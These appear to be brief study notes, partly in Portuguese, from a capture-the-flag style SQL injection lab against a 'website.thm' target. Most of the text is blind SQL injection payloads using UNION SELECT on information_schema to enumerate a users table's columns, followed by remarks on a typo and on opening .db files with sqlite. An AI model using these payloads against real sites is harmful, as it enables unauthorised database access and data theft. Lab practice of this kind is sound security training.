...
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information\_schema.COLUMNS WHERE TABLE\_SCHEMA='sqli\_three' and TABLE\_NAME='users' and COLUMN\_NAME like 'user\_ame' and COLUMN_NAME !='%';

UNION SELECT 1,2,3 FROM information\_schema.COLUMNS WHERE TABLE\_SCHEMA='sqli\_three' and TABLE\_NAME='users' and column\_name like 'id' and COLUMN\_NAME != 'password' and COLUMN\_NAME != 'user\_ame';'

na verdade era username mesmo, por algum motivo o sql deu "_" como "n"

databases podem ser so arquivos, usar sqlite para abrir .db
